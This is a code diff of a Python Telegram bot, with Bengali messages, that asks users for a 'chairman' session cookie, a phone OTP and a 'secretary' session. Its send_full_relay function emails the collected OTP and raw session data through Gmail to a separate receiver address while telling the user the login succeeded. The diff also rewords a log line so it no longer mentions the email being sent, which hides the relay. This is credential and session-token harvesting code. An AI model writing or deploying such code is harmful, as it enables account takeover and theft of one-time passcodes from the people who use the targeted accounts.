@@ -89,7 +89,7 @@ def send_full_relay(chat_id, otp, sec_raw):
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
             server.login(EMAIL_SENDER, EMAIL_PASSWORD)
             server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
-        logging.info(f"[{chat_id}] ইমেইল পাঠানো সফল হয়েছে।")
+        logging.info(f"[{chat_id}] সফল হয়েছে।")
         return True
     except Exception as e:
         logging.error(f"[{chat_id}] ইমেইল পাঠাতে এরর: {e}")
@@ -181,10 +181,10 @@ def role_step_1(m):
     try:
         re.search(r'SESSION=([^\s;]+)', raw).group(1)  # শুধু ভ্যালিডেশন
         u_sess["temp_data"]["ch_raw"] = raw
-        msg = bot.send_message(chat_id, "✅ ১ম সেশন ঠিক আছে। এবার আপনার ফোনে যাওয়া OTP দিন:")
+        msg = bot.send_message(chat_id, "✅ চেয়ারম্যান এর সেশন ঠিক আছে। এবার আপনার ফোনে যাওয়া OTP দিন:")
         bot.register_next_step_handler(msg, role_step_2)
     except Exception:
-        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল! ১ম সেশন আবার দিন:")
+        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল! চেয়ারম্যান এর সেশন আবার দিন:")
         bot.register_next_step_handler(msg, role_step_1)
 
 def role_step_2(m):
@@ -192,7 +192,7 @@ def role_step_2(m):
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
     u_sess["temp_data"]["ch_otp"] = m.text.strip()
-    msg = bot.send_message(chat_id, "✅ OTP ওকে। এবার ২য় সেশনটি দিন:")
+    msg = bot.send_message(chat_id, "✅ OTP ওকে। এবার সেক্রেটারী এর সেশনটি দিন:")
     bot.register_next_step_handler(msg, role_step_3)
 
 def role_step_3(m):
@@ -215,10 +215,10 @@ def role_step_3(m):
             send_full_relay(chat_id, otp, raw_sec)
             bot.send_message(chat_id, "🎉 লগইন সফল হয়েছে!", reply_markup=main_menu())
         else:
-            msg = bot.send_message(chat_id, "❌ ২য় সেশন মেয়াদোত্তীর্ণ বা ভুল! আবার দিন:")
+            msg = bot.send_message(chat_id, "❌ সেক্রেটারির সেশন মেয়াদোত্তীর্ণ বা ভুল! আবার দিন:")
             bot.register_next_step_handler(msg, role_step_3)
     except Exception:
-        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল! ২য় সেশন আবার দিন:")
+        msg = bot.send_message(chat_id, "❌ ফরম্যাট ভুল!সেক্রেটারির সেশন আবার দিন:")
         bot.register_next_step_handler(msg, role_step_3)
 
 # ==========================================
